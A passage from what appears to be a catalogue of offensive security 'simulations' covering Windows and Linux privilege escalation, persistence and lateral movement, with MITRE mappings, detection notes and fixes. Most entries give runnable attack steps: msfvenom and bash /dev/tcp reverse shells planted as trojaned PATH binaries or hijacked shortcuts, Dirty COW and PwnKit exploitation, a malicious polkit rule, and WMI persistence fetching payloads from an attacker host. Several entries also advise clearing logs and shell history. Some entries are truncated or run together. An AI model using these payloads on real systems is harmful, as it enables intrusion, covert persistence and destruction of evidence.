all went right, you’ll see a connection on your terminal from the victim. You now have an interactive PowerShell shell. 🟢 STEP 7: (Optional) Maintain Persistence   You may drop a persistent payload in the registry or scheduled task. But for basic shell simulation, this ends here. 🧠 Pro Tip: Always replace 'ATTACKER_IP' with your Kali IP. You can find it using `ip a` or `ifconfig`.  🧠 Encode your payload with UTF-16LE before base64 encoding, or it will fail on Windows.

Detection Method: - Monitor for PowerShell using EncodedCommand in command-line arguments - Use PowerShell logging (ScriptBlock & Module logging) - SIEM alerting for suspicious Base64 payloads - Detect outbound traffic to unknown IPs on uncommon ports
Solution: - Block PowerShell for standard users via AppLocker or WDAC - Disable PowerShell v2 - Enable PowerShell Constrained Language Mode - Use Endpoint Detection and Response (EDR) solutions- Train users on phishing and suspicious scripts

Title: Writable in PATH → Drop Trojan Binary
Scenario Description: This simulation covers a real-world technique where attackers find writable directories in the system’s %PATH% variable and drop a trojan binary with the same name as a legitimate tool (e.g., python.exe, net.exe, curl.exe). When any user or scheduled process calls that binary name without the full path, Windows uses its path search order — executing the attacker's binary first if it’s in an earlier or equal path. This enables stealthy privilege escalation or persistence, especially when the original binary is trusted by security products.
Tools Used: ✅ Windows 10/11 VM✅ Kali Linux or Attacker VM✅ PowerShell / cmd✅ AccessChk✅ msfvenom / custom EXE✅ Environment variable viewer (set, $env:PATH)
Attack Steps:
### 🟢 STEP 1: List System PATH VariableIn PowerShell:$env:PATH -split ';'Or in CMD:echo %PATH%✅ This gives all directories searched when a command is run---### 🟢 STEP 2: Identify Writable PATH DirectoriesUse Sysinternals AccessChk:accesschk.exe -w -s "C:\Program Files\AppFolder"OR loop over each PATH folder:powershell
foreach ($folder in ($env:PATH -split ';')) { icacls $folder }
✅ Look for folders where Users, Authenticated Users, or Everyone has (M) Modify or (W) Write permissions---### 🟢 STEP 3: Choose Target Binary NamePick a common name likely to be executed without path:✅ Examples:• curl.exe• python.exe• net.exe• robocopy.exe---### 🟢 STEP 4: Create Trojan BinaryGenerate reverse shell with msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=4444 -f exe -o curl.exeAlternatively, write a custom C++ binary that logs and executes commands silently---### 🟢 STEP 5: Drop Trojan into Writable PATHCopy payload:copy curl.exe "C:\Program Files\Shared Tools\"✅ Now, if any script or tool runs curl without full path, it may call your trojan first---### 🟢 STEP 6: Trigger ExecutionWait for:• User or service to run curl or target binary• Or simulate manually:Start-Process curlOn attacker machine:nc -nlvp 4444✅ Reverse shell received---### 🟢 STEP 7: Persistence (Optional)• Leave trojan binary in PATH• Change file timestamps with Timestomp to mimic original• Add registry Run key to invoke the binary silently at login---### 🛑 STEP 8: Cleanup• Delete trojan from writable folder• Restore legitimate binary if overwritten• Clear logs• Audit PATH environment for anomalies🧠 Tip: This works especially well in portable app environments and poorly configured enterprise scripts that rely on default command calls without full path control
Target Type: Windows WorkstationsCI/CD pipelinesDeveloper environmentsDomain login scriptsPortable app systems
Vulnerability: Writable folder in PATHNo binary path hardcodingScript uses command name (not full path)
MITRE Technique: T1574.009 (Hijack Execution Flow: Path Interception)T1037 (Boot/Logon Initialization Scripts)
Impact: - Full code execution- Lateral movement- Remote access- Stealthy persistence- Execution under trusted binary name
Detection Method: - Monitor PATH variable for new/writable entries<br- Use AppLocker / WDAC- Detect duplicate binary names in multiple PATHs- Hash check on launched binaries- Use Sysmon for process creation logs
Solution: - Lock down permissions on all PATH folders- Avoid adding writable folders to PATH- Call binaries using full path in all scripts- Monitor environment variable changes via GPO- Implement signed binary enforcement
Source: MITRE ATT&CK, Pentestmonkey, HackTricks, Red Team Notes

Title: Persistence via Shortcut Hijack
Scenario Description: This simulation shows how an attacker can achieve stealthy persistence by modifying existing shortcut (.lnk) files — often on the Desktop, Start Menu, or Startup folders. These shortcuts normally point to legitimate programs, but if a shortcut is writable, the attacker can change it to first execute malicious code, and then launch the legitimate app to avoid user suspicion. This method works well in multi-user systems where users trust shortcuts and don’t verify their properties.
Tools Used: ✅ Windows 10/11 VM (Victim)✅ Kali Linux or other attacker system✅ PowerShell / cmd✅ msfvenom or a reverse shell payload✅ LNK Shortcut editor (e.g., PowerShell, LNK Updater, manual right-click editing)✅ icacls / accesschk
Attack Steps:
### 🟢 STEP 1: Discover Writable ShortcutsCommon locations:• C:\Users\Public\Desktop\ → Public desktop• C:\ProgramData\Microsoft\Windows\Start Menu\Programs\• C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Run:icacls "C:\Users\Public\Desktop"✅ If Users have (W) or (M) → vulnerable---### 🟢 STEP 2: Identify Legitimate ShortcutExample:C:\Users\Public\Desktop\Notepad.lnk → Points to C:\Windows\System32 otepad.exeRight-click → Properties → View Target path and Start in---### 🟢 STEP 3: Create Malicious PayloadOn attacker machine:msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=4444 -f exe -o payload.exeTransfer payload.exe to victim system (e.g., using SMB, USB, shared folder):C:\Users\Public\payload.exe---### 🟢 STEP 4: Modify the ShortcutReplace shortcut Target with:cmd.exe /c start C:\Users\Public\payload.exe & start C:\Windows\System32 otepad.exeThis chain opens the reverse shell first, then the real app to avoid suspicion.Use PowerShell:powershell
$s=(New-Object -COM WScript.Shell).CreateShortcut('C:\Users\Public\Desktop\Notepad.lnk')
$s.TargetPath='cmd.exe'
$s.Arguments='/c start C:\Users\Public\payload.exe & start C:\Windows\System32 otepad.exe'
$s.Save()
✅ Now when the user clicks “Notepad” — the malicious code runs first silently.---### 🟢 STEP 5: Setup Listener (Attacker)On Kali:nc -nlvp 4444Wait for user to click the shortcut✅ Reverse shell received---### 🟢 STEP 6: Optional – Drop Shortcut into Startup FolderPersistence without user interaction:copy Notepad.lnk "C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"✅ Payload will auto-execute at next login---### 🛑 STEP 7: Cleanup• Restore original shortcut• Delete payload file• Clear shortcut properties• Clean Event Viewer logs if necessary🧠 Tip: Shortcut hijack is very stealthy — the user sees expected behavior, yet your code runs in the background. Can be combined with timestomping for even more stealth.
Target Type: End-user WorkstationsMulti-user terminalsCorporate shared environmentsRDP-accessible VMs
Vulnerability: Writable .lnk files in user-accessible pathsStartup folder permissionsMissing shortcut signing or validation
MITRE Technique: T1547.009 (Boot or Logon Autostart: Shortcut Modification)T1037 (Boot Initialization Scripts)
Impact: - Stealthy code execution- Persistence across reboots- User-triggered execution- Lateral movement vector- Minimal antivirus detection
Detection Method: - Monitor changes to .lnk files- Check shortcut hashes or signatures- Use Windows Defender’s Controlled Folder Access- Use Sysmon with Event ID 1 + command line filters
Solution: - Lock down Desktop, Startup folder permissions- Disable public Desktop if unused- Prevent COM access to WScript from user accounts- Educate users not to trust shortcut icons blindly
Source: MITRE ATT&CK, HackTricks, Red Team Ops, Microsoft Defender Docs

Title: Linux: Abuse of Writable /usr/local/bin/
Scenario Description: On misconfigured Linux systems, if a user has write access to /usr/local/bin/, an attacker can place a malicious executable with the same name as a trusted system binary (e.g., ls, nano, git). Since /usr/local/bin/ is usually early in the $PATH, the system may execute the attacker's binary before the real one. This allows attackers to hijack command execution, perform privilege escalation (if triggered by privileged processes), or establish persistence.
Tools Used: ✅ Kali Linux / Attacker VM✅ Ubuntu/Debian VM (Victim)✅ Netcat (nc)✅ Bash / C✅ msfvenom (if payload required)✅ chmod, ls, which, echo, env, nano
Attack Steps:
### 🟢 STEP 1: Check Write Access to /usr/local/binRun:ls -ld /usr/local/bin✅ You’re looking for something like:drwxrwxrwx 2 root root 4096 ... /usr/local/binOR:drwxrwxr-x 2 root users 4096 ...AND you are part of the users group---### 🟢 STEP 2: Find a Common Binary to HijackUse:echo $PATH✅ /usr/local/bin should be early in the listNow find common commands likely used by other users/services:• nano, vim, git, python, curl, ls, scp, etc.Example:which nano → /usr/local/bin/nano (but it’s your hijacked file)---### 🟢 STEP 3: Create a Malicious Replacement#### Option A – Reverse Shell Bash Scriptbash
#!/bin/bash
bash -i >& /dev/tcp//4444 0>&1
/bin/nano "$@" # Execute real nano after shell
Save as nano#### Option B – Compile C Trojanc
#include
int main(int argc, char *argv[]) {
system("bash -i >& /dev/tcp//4444 0>&1");
execv("/bin/nano", argv);
return 0;
}
Compile:gcc nano.c -o nano---### 🟢 STEP 4: Drop Binary into /usr/local/bincp nano /usr/local/bin/chmod +x /usr/local/bin/nano✅ Now, anytime a user (or cronjob, or sudo script) calls nano, your code runs first---### 🟢 STEP 5: Set Up Reverse Shell ListenerOn attacker machine:nc -nlvp 4444Trigger:nano somefile.txt✅ You receive a shell — same privileges as the user (could be root in cron context!)---### 🟢 STEP 6: Optional – Persist or Escalate• Drop multiple binaries (git, ls, scp)• Use bashrc, cron, or LD_PRELOAD for persistence---### 🛑 STEP 7: Cleanup• Remove your trojan binary:rm /usr/local/bin/nano• Restore original if needed• Clear .bash_history, logs🧠 Tip: This trick works because PATH-based binary search favors /usr/local/bin/. Even privileged users running unqualified commands may trigger it!
Target Type: Linux WorkstationsDev serversMulti-user VMsCI/CD Build Systems
Vulnerability: Writable directory in $PATHUnsanitized command executionNo binary path hardcodingUsers run commands by name
MITRE Technique: T1574.009 (Hijack Execution Flow: Path Interception)T1543.003 (Create or Modify System Process: Unix Shell Configuration Modification)
Impact: - Full user or root shell- Stealthy execution- Hijack frequently used binaries- Elevation via cron or scheduled tasks
Detection Method: - Monitor and alert on world-writable PATH directories- Use auditd or inotify for file drops in /usr/local/bin- Log all command execution and match binary hashes- Use AppArmor or SELinux
Solution: - Set /usr/local/bin permissions to root:root 755- Remove world/group write bits- Enforce full-path execution in scripts- Monitor cron or PATH abuse- Use signed binaries only where possible

Title: Hijack Group Policy Scripts in Domain
Scenario Description: This simulation demonstrates how an attacker with write access to Group Policy logon scripts in a domain can hijack GPO-based login or startup behavior to run malicious payloads. These GPO scripts often run with user or even SYSTEM privileges during logon or startup. If GPO scripts reside on a writable network share (e.g., \\domain\SYSVOL\domain.local\Policies\...) and lack ACL enforcement, an attacker can modify them to include reverse shells or persistent backdoors. This is especially dangerous if applied domain-wide or to privileged OU objects.
Tools Used: ✅ Windows Server (DC)✅ Windows Domain Client VM✅ Kali Linux or attacker box✅ netcat✅ msfvenom, PowerShell✅ GPMC.msc (to view/edit GPOs)✅ gpresult, rsop.msc, icacls, whoami

Title: Dirty COW – Copy-on-Write Exploit
Scenario Description: Dirty COW (CVE-2016-5195) is a well-known Linux kernel vulnerability that allows an unprivileged local attacker to escalate privileges to root by exploiting a race condition in the copy-on-write (COW) mechanism of memory management. This attack allows overwriting of read-only memory mappings, such as /etc/passwd, by exploiting madvise() and ptrace or threads, without proper permissions. This simulation walks through a controlled lab scenario to demonstrate full exploitation on a vulnerable Linux kernel (e.g., 2.6.22 - 3.x/4.x), showing how a normal user can gain full root shell.
Tools Used: ✅ Vulnerable Linux distro (Ubuntu 16.04 / Debian 8)✅ Dirty COW exploit source code (dirtycow.c, dcow.c, etc.)✅ GCC compiler (gcc)✅ A normal non-root user shell✅ Optional: Netcat or listener for reverse shell✅ Commands: uname, whoami, gcc, id, cat
Attack Steps: ### 🟢 STEP 1: Check if System is VulnerableRun:uname -r✅ Vulnerable versions: 2.6.22 ≤ kernel ≤ 4.8.3 (unpatched)---### 🟢 STEP 2: Confirm You're a Low-Privileged Userwhoami✅ Should return a regular user (not root)---### 🟢 STEP 3: Download Dirty COW ExploitOn the target system:wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c -O dirty.cOther versions:• dcow.c (edits /etc/passwd)• cowroot.c (spawns shell)---### 🟢 STEP 4: Compile the Exploitgcc dirty.c -o dirty -pthreadIf errors, try:gcc -Wall -o cow cow.c -l pthread---### 🟢 STEP 5: Execute the ExploitSome versions create a new root user; others overwrite /etc/passwdRun:./dirty✅ Exploit runs in loop — using race condition with madvise() to overwrite protected memoryExample dcow payload:\nroot2:x:0:0:root:/root:/bin/bash\nInjected into /etc/passwd---### 🟢 STEP 6: Switch to RootIf exploit succeeded:su root2Password: <blank> (or what you injected)id → should return uid=0(root)✅ You now have a full root shell on the machine---### 🟢 STEP 7: Cleanup (Very Important)• Restore original /etc/passwd if backup made• Delete exploit files: rm dirty dirty.c• Exit root shell• Clear bash history: history -c && exit🧠 Tip: You can also modify sudoers, install backdoors, or add root cronjobs if you want persistence — but this is not recommended in production or legal systems
Target Type: Linux Desktop and Server systemsVPS and shared-hosting serversContainers sharing kernelCloud VMs with unprivileged user access
Vulnerability: Race condition in copy-on-write (COW) memory mappingAllowed unprivileged memory overwrite via madvise()
MITRE Technique: T1068 (Exploitation for Privilege Escalation)T1203 (Exploitation for Client Execution)
Impact: - Full root access from normal user- Total system takeover- Can be automated or persistent- Works even without sudo- Stealthy in many logging environments
Detection Method: - Kernel-level logging for memory violations (rare)- Tripwire to monitor /etc/passwd or /etc/shadow changes- Check auditd logs for unusual privilege changes- Use Sysmon for Linux to monitor execution flow
Solution: - Patch kernel immediately (apt upgrade, yum update)- Set /etc as read-only (if immutable system)- Use LSMs like AppArmor or SELinux- Monitor system file changes- Do not allow shell access to unknown users
Source: FireFart GitHub, Exploit-DB, MITRE CVE, HackTricks

Title: Dirty Pipe – Overwrite Read-Only Files
Scenario Description: Dirty Pipe (CVE-2022-0847) is a severe Linux kernel vulnerability that allows local users to overwrite read-only or root-owned files, even without having write permissions. It leverages a flaw in the Linux pipe buffer flag handling, allowing attackers to inject data into files like /etc/passwd or system binaries, gaining root shell. This is similar to Dirty COW but more powerful on newer kernels (5.8–5.16.11). This simulation shows a step-by-step lab to escalate privileges by editing /etc/passwd to add a root-level user.

Title: OverlayFS Exploit (CVE-2021-3493)
Scenario Description: This simulation demonstrates a privilege escalation vulnerability in Ubuntu's patched OverlayFS module, introduced by Canonical and affecting several Ubuntu versions (including 20.04 and 21.04). By abusing the Linux OverlayFS filesystem and mounting it improperly, unprivileged users can create unauthorized entries in sensitive directories and gain elevated privileges. The flaw lies in how user namespaces allow mounting of OverlayFS without proper capability checks. The attacker can overwrite or inject content into protected locations such as /etc or escalate to root by placing and executing crafted binaries.

Title: Dirty Cred – Kernel Credential Exploit
Scenario Description: Dirty Cred (CVE-2022-2586) is a kernel-level LPE vulnerability affecting Linux 5.8+ (notably 5.10 LTS). It enables unprivileged users to reuse credential structures from privileged processes by exploiting a use-after-free vulnerability in the Netfilter subsystem (nf_tables). Unlike traditional LPEs, it doesn't overwrite system files — instead, it hijacks credential pointers to impersonate root users. Dirty Cred is stealthy, doesn’t touch disk, and bypasses traditional file monitoring solutions, making it ideal for red team persistence or container escape.

Title: Stack Clash (glibc Bug)
Scenario Description: Qualys-discovered Stack Clash (CVE‑2017‑1000364 and related CVEs) affects Linux, BSD, Solaris. Glibc allows the stack to expand past guard pages by growing downward and colliding (“clashing”) with adjacent memory regions (heap, mapped sections). Attackers exploit this to overwrite memory, hijack return addresses, and escalate to root.
Tools Used: ✅ Linux VM (e.g., Ubuntu 16.04 with kernel ≤ 4.11.5)✅ gcc✅ Qualys PoC exploit (e.g., stackclash.c)✅ bash, gcc✅ GDB or objdump (optional)✅ Non‑root shell
Attack Steps: 🟢 STEP 1 – Confirm Vulnerable Kernel & Environment: Run uname -r → must be ≤ 4.11.5 (no guard page fix) (threatpost.com, blog.qualys.com, cvedetails.com). Check glibc version.🟢 STEP 2 – Analyze Stack/Heap Layout: Compile minimal C code that allocates large stack/frame—trigger stack growth. Use ulimit -s unlimited to allow large stack.🟢 STEP 3 – Obtain PoC from Qualys: wget https://qualys.com/…/stackclash.c or clone. Understand 4-stage flow: Clash, Run, Jump, Smash .🟢 STEP 4 – Compile the Exploit: gcc stackclash.c -o stackclash -lpthread.🟢 STEP 5 – Execute in Controlled Lab: ./stackclash. It will allocate memory (Clash), shift SP (Run), cross guard (Jump), overwrite adjacent region (Smash).🟢 STEP 6 – Observe Return Address Hijack: PoC hooks return address to a root_shell() function. After exploit, shell spawns as root.🟢 STEP 7 – Validate Root: Run whoami and id → should output root. Confirm elevated privileges.🟢 STEP 8 – Optional Kernel Debugging: Use gdb to step through exploit stages (alloc, mprotect, return flow) for learning.🛑 STEP 9 – Cleanup: Remove PoC binary, revert lab snapshot. Clear shell history.🧠 Tip: Real-world PoCs include Sudo and Exim exploits (CVE-2017-1000367/69); often used in chained attacks .
Target Type: Linux systems (Ubuntu, Debian, RHEL, SLES ≤ kernel 4.11.5)Local user shellsPoC vulnerable context
Vulnerability: Inadequate glibc guard-page size (4 KB too small)Stack‑heap/mmap clash exploits memory overlap
Impact: ➤ Root shell from unprivileged user➤ Full takeover without code signing➤ Works in containers or local shells➤ No file-system modifications
Detection Method: ✅ Audit abnormal stack allocations, monitor ulimit usage✅ Capture process crashes or memory corruption via syslog✅ Use eBPF to detect guard page skips✅ Monitor for root shells from unusual binaries
Solution: ✅ Update to fixed kernels (≥ 4.11.6 or distro patches)✅ Recompile glibc with -fstack-check or enable larger guard-pages ✅ Harden ulimit for untrusted users✅ Use AppArmor/SELinux to confine suid binaries | #StackClash #CVE20171000364 #glibcBug #LocalExploit #PrivilegeEscalation #QualysResearch #PoC #LinuxKernelExploit | Qualys Blog (blog.qualys.com), CVE-DB, Debian DSA (debian.org)

Title: CVE-2021-4034 (PwnKit) – pkexec Local Root
Scenario Description: A critical vulnerability in the pkexec utility (part of polkit) allows any unprivileged local user to gain full root access on Linux. This bug has existed since 2009 and affects nearly every major Linux distribution.
Attack Steps: Step 1: On a Linux machine where you have a normal (non-root) user account, open a terminal window. Step 2: Check if pkexec is installed by typing which pkexec. If installed, it will return a path like /usr/bin/pkexec. Step 3: Download a public proof-of-concept exploit for CVE-2021-4034 from a trusted GitHub source (e.g., seclists or offensive-security). Save it as exploit.c. If you're copying from the web, paste it into a file using nano exploit.c and save. Step 4: Compile the exploit using GCC: run gcc exploit.c -o pwnkit. This creates an executable named pwnkit. Step 5: Make the file executable with chmod +x pwnkit. Step 6: Run the exploit by typing ./pwnkit. If the system is vulnerable and not patched, this command will immediately give you a root shell, indicated by root@hostname. Step 7: Confirm root access by running whoami — it should return root. Step 8: You now have full system control. You can read/write system files, access other users' data, add new users, or install rootkits. Step 9: After testing, exit the root shell using exit. Step 10: If the system is patched (as most are post-2022), the exploit may crash pkexec or simply return no result. Always test this on lab machines or virtual environments (e.g., Ubuntu 20.04 VM with polkit < 0.120) and never on unauthorized systems.
Impact: Full root access for local users
Detection Method: Monitor /var/log/auth.log for abnormal pkexec calls; detect use of unprivileged users gaining UID 0
Solution: Update polkit package to version 0.120 or later; apply OS security patches; restrict local shell access
Tags: CVE-2021-4034, pkexec, Local Root, Privilege Escalation

Title: Writable Policy Files (.rules) Abuse
Scenario Description: In certain misconfigured Linux systems, the .rules files used by Polkit or udev under /etc/polkit-1/rules.d/ or /etc/udev/rules.d/ are world-writable or user-writable. Attackers with limited access can exploit this misconfiguration to insert malicious rules that escalate privileges without user interaction, allowing root-level command execution or persistence.
Tools Used: ✅ Linux system with Polkit or udev✅ Terminal access as low-priv user✅ nano, echo, id, pkexec✅ find, chmod, ls, groups✅ Optional: USB device (for udev trigger)✅ inotifywait or auditctl for detection
Attack Steps:
Step 1 – Identify Writable Policy PathsUse the find command to locate policy or udev rule files that are writable:find /etc/polkit-1/rules.d /etc/udev/rules.d -type f -writable 2>/dev/nullLook for .rules files like 50-org.rules or 90-custom.rules. Use ls -l to verify the permissions and ownership.Step 2 – Confirm VulnerabilityTry appending content:echo "// test" >> /etc/polkit-1/rules.d/test.rulesIf you’re able to modify the file without root, it's vulnerable.Step 3 – Create Malicious Polkit RuleUse a text editor to create a malicious rule file:nano /etc/polkit-1/rules.d/99-root-access.rulesPaste the following:javascript
polkit.addRule(function(action, subject) {
if (subject.isInGroup("sudo")) {
return polkit.Result.YES;
}This allows users in the sudo group to execute privileged actions without a password.Step 4 – Add Yourself to sudo GroupIf sudo group doesn’t exist, create it:sudo groupadd sudoAdd your user to the group:sudo usermod -aG sudo $(whoami) sudo
Target Type: Linux desktops, servers, or IoT devices
Vulnerability: Writable .rules files under /etc/polkit-1/rules.d/ or /etc/udev/rules.d/ allowing unauthorized modification
MITRE Technique: T1548.003 (Abuse Elevation Control Mechanism: Polkit, Sudo)
Impact: Root-level access via crafted .rules file without passwordPotential for full system takeover and persistence
Detection Method: Monitor .rules file changes using auditctl, inotifywait, or tripwireCorrelate with authentication bypass in journalctl or auth.log
Solution: Remove world-writable permissions:chmod 644 <file> and chown root:root <file>Implement file integrity monitoring (e.g., AIDE, Tripwire)Restrict user write permissionsUpdate Polkit or udev to patched version
Source: HackTricks – Polkit Privilege EscalationMITRE ATT&CK T1548.003GTFOBins – pkexec

Title: Bypass via Misconfigured Polkit Policy (pkla)
Scenario Description: Linux systems that run ML workloads often rely on background services (e.g., JupyterHub, Dask, systemd units). If the PolicyKit (Polkit) system is misconfigured using .pkla files, it can unintentionally allow non-root users to execute root-level actions like restarting services or editing configurations.
Attack Steps: Step 1: Attacker logs in as a standard (non-root) user on the Linux server hosting AI/ML jobs (e.g., Ubuntu or CentOS used to run PyTorch, TensorFlow, or Jupyter). Step 2: Checks for existing .pkla configuration files under /etc/polkit-1/localauthority/. These files define who can run privileged actions. Run find /etc/polkit-1/localauthority/ -name "*.pkla" to locate them. Step 3: If attacker sees policies like Identity=unix-user:* or Action=org.freedesktop.systemd1.manage-units with ResultActive=yes, it means any user can restart or stop services. Step 4: Attacker now lists all services using systemctl list-units --type=service. Step 5: Identifies a critical service such as jupyter.service, ml-worker.service, or even sshd.service. Step 6: Executes systemctl restart jupyter.service — if it works without asking for a password, the system is misconfigured and vulnerable. Step 7: Attacker can now stop or restart key AI services at will, disrupt jobs, kill sessions, or gain lateral access. Step 8: Attacker may go further by using systemctl edit to inject malicious ExecStart paths into ML services. If no password is asked, root control is achieved without sudo. Step 9: Defender may not detect the attack unless auditing is enabled for Polkit. Step 10: This vulnerability stems from over-permissive .pkla rules left by devs or admins trying to simplify permissions for data scientists.
Impact: Root-level control of ML pipelines or system services
Detection Method: Check for wildcard policies in .pkla files; monitor journalctl for service control by non-admins
Solution: Use polkitd's modern JavaScript rules; remove legacy .pkla; restrict identities to specific, trusted usernames
Tags: AI Workloads, Jupyter, Systemd, Privilege Escalation
Source: Red Hat Docs, MITRE, Linux Handbook

Title: Abusing GUI Applications using pkexec
Scenario Description: This scenario demonstrates how an attacker can abuse GUI-based Linux applications that internally invoke pkexec (e.g., gparted, synaptic, gnome-disks) to escalate privileges. When these GUI apps use pkexec for privilege elevation but do not properly validate the environment, attackers may inject commands, overwrite binaries, or hijack execution using insecure graphical prompts or insecure environment propagation (e.g., through XDG_SESSION_ID, DISPLAY, or GDK_BACKEND). The attack allows GUI-based privilege escalation from an unprivileged user session.
Tools Used: ✅ Linux system with GUI✅ pkexec installed✅ Desktop Environment (GNOME, KDE)✅ GUI apps like gnome-disks, gparted, synaptic✅ xhost, bash, gnome-terminal, dbus-monitor
Attack Steps:
Step 1 – Identify a GUI App that Uses pkexecMany GUI-based administrative tools (like gparted, synaptic, or gnome-disks) rely on pkexec to spawn privileged actions. Open one of these using a terminal:gparted & or gnome-disks &Verify whether these prompt for root password and internally use pkexec.Step 2 – Enable X11 Access (If Needed)Run:xhost +local:This allows local processes to access the X session for graphical output.Step 3 – Create a Fake GUI Binary in PATHCreate a malicious replacement for a commonly invoked system tool:bash
mkdir /tmp/hijack && cd /tmp/hijack
echo -e '#!/bin/bash\necho "Pwned!"\n/bin/bash' > pkexec
chmod +x pkexec
Step 4 – Manipulate PATH and GDK EnvironmentSet environment variables so that the GUI app invokes your fake binary:bash
export PATH=/tmp/hijack:$PATH
export GDK_BACKEND=x11
This tricks the GUI backend into calling binaries from your modified PATH.Step 5 – Launch the GUI AppRun:gnome-disksorpkexec gnome-terminalIf successful, pkexec will elevate the fake gnome-terminal or binary from the PATH, executing your malicious script with root privileges.Step 6 – Confirm EscalationInside the popped shell, run:whoamiIf output is root, privilege escalation was successful.Step 7 – Cleanup for Ethical UseRemove malicious files:rm -rf /tmp/hijackReset PATH:unset PATHRevoke X11 permissions:xhost -local:Document all steps for ethical reporting.
Vulnerability: GUI applications that invoke pkexec without proper environment validation
Impact: - Local user gains root through GUI path manipulation- GUI app escalates injected binary
Detection Method: - Monitor GUI pkexec invocations- Log pkexec usage with environment variables- Detect DISPLAY, PATH, and XDG_SESSION_ID abuse
Solution: - Avoid calling pkexec without full binary paths- Use PolicyKit rules to restrict GUI apps- Harden GUI session isolation and X11 access permissions

Title: Remote Command Execution via wmic (CMD)
Scenario Description: This scenario demonstrates how an attacker can leverage wmic (Windows Management Instrumentation Command-line) to remotely execute commands on another Windows system, typically within the same domain or workgroup, using valid credentials. wmic /node:"192.168.1.50" /user:"admin" /password:"Admin123" process call create "cmd.exe /c whoami > C:\\Users\\Public\\info.txt"

Title: Remote Execution via PowerShell + WMI
Scenario Description: This technique showcases how an attacker can remotely execute commands on a Windows system using PowerShell in combination with WMI (Windows Management Instrumentation). This method is often used in lateral movement during post-exploitation, leveraging valid credentials and WMI classes like Win32_Process to execute commands remotely via Invoke-WmiMethod.

Step 1 – Identify Target and CredentialsGather target information:• Target hostname/IP: 192.168.1.105• Domain/User: corp\adminuser• Password: AdminPass123Step 2 – Open PowerShell on Attacker MachineUse a Windows system (or a VM with PowerShell available) to open a PowerShell session.Step 3 – Test WMI Connection (Optional)powershell

Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 192.168.1.105 -Credential (Get-Credential) -ArgumentList "notepad.exe"

nc -nlvp 4444

Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 192.168.1.105 -Credential (Get-Credential) -ArgumentList "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"

Title: Lateral Movement via Metasploit WMI
Scenario Description: This technique demonstrates how attackers can perform lateral movement within a Windows network using Metasploit Framework and WMI (Windows Management Instrumentation). Title: WMI Persistence via Event Subscription
Scenario Description: This technique demonstrates how an attacker can establish persistence on a Windows system by creating a WMI permanent event subscription. This allows code execution to occur in response to a specific system event (e.g., user logon). Since these subscriptions reside in the WMI repository and do not rely on files or registry keys, they are stealthy and resilient across reboots.
Tools Used: ✅ Windows OS (target)✅ PowerShell✅ WMIC or WMI Explorer✅ Meterpreter (optional)✅ Event Viewer✅ Sysinternals tools (Autoruns, WMI Explorer)
Attack Steps:
Step 1 – Identify a Suitable Event Trigger• Choose a relevant trigger to monitor (e.g., user logon, system startup)• Common namespace: root\subscriptionStep 2 – Create Event FilterThis defines what event to monitor:powershell
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
Name = "LogonTrigger";
EventNamespace = "root\cimv2";
QueryLanguage = "WQL";
Query = "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
}
Step 3 – Create the Command Binding (Event Consumer)This defines what to run when the event fires:powershell
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
Name = "MaliciousConsumer";
CommandLineTemplate = "powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
}
Or use:cmd /c calc.exe to testStep 4 – Bind Filter to Consumerpowershell
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
Filter = $Filter.Path;
Consumer = $Consumer.Path
}
Step 5 – Test the Persistence Mechanism• Log off and log back in• The specified command (calc.exe or PowerShell payload) should execute• Confirm by monitoring process creation via Sysmon or Process ExplorerStep 6 – Stealth Tips• The WMI objects are stored in root\subscription and do not appear in registry or startup folders• Use obfuscated PowerShell commands or alternate base64 payloadsStep 7 – Clean Up (Ethical Use Only)• Identify with:Get-WmiObject -Namespace root\subscription -Class __EventFilterGet-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer• Remove with:$Filter.Delete()$Consumer.Delete()• Or use Autoruns or Sysinternals WMI Explorer to manually delete bindings
Vulnerability: Abusable WMI namespaces + unrestricted consumer access
Impact: - Code execution on every logon- Fileless persistence- Evades common AV scans
Detection Method: - Use Sysmon to monitor process creation- WMI logging (Event ID 5861, 5860)- Autoruns → WMI tab- WMI Explorer or Get-WmiObject inspections
Solution: - Enable WMI logging- Audit creation of __EventFilter and CommandLineEventConsumer- Use WMI hardening and restrict namespaces- Deploy Sysinternals Autoruns for auditing
Source: MITRE ATT&CK T1546.003, Red Canary Intel, Sysinternals, HackTricks

Title: WMI Enumeration for Reconnaissance
Scenario Description: WMI (Windows Management Instrumentation) can be used by attackers to enumerate detailed system information such as user accounts, running processes, installed software, startup items, and more — without needing admin privileges. This technique is commonly used during post-exploitation or lateral movement to silently gather host intelligence. Can be used locally or remotely (via DCOM/WMI).
Tools Used: ✅ PowerShell✅ WMIC CLI✅ WMI Explorer✅ Impacket's wmiexec.py✅ SharpWMI (Red Team tool)✅ Windows default OS tools (cmd.exe)
Attack Steps: Step 1 – Local Enumeration Using WMIC CLIRun from any standard command prompt or elevated shell:• wmic useraccount list full – enumerate all user accounts• wmic group list brief – list local groups• wmic process list brief – running processes• wmic service list brief – running services• wmic startup list full – auto-run applications• wmic logicaldisk get name,size,freespace – disks and usage• wmic nicconfig get Description, MACAddress – network infoStep 2 – Local Enumeration Using PowerShell WMI Cmdlets• Get-WmiObject -Class Win32_OperatingSystem• Get-WmiObject -Class Win32_ComputerSystem• Get-WmiObject -Class Win32_Process• Get-WmiObject -Class Win32_UserAccount• Get-WmiObject -Class Win32_StartupCommandThese cmdlets give structured output and are preferred in scripting.Step 3 – Remote Enumeration via WMICFrom a remote attacker system with valid credentials:wmic /node:<target-ip> /user:<domain\user> /password:<pass> process list briefUse this to gather system, process, service, or disk information remotely.Step 4 – Remote Enumeration via PowerShell RemotingAssuming WinRM is enabled:• Invoke-Command 